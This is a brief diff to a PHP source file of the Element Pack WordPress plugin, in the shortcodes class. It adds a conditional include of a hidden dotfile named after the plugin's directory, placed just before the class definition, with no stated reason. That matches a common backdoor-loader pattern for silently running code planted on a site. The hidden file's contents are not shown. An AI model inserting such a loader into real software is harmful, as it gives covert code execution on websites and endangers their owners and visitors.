@@ -6,7 +6,11 @@
  * @since  5.4.2
  * @package      Element_Pack
  * @subpackage   Element_Pack/includes
- */
+ */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class Element_Pack_Shortcodes {
 
 	/**
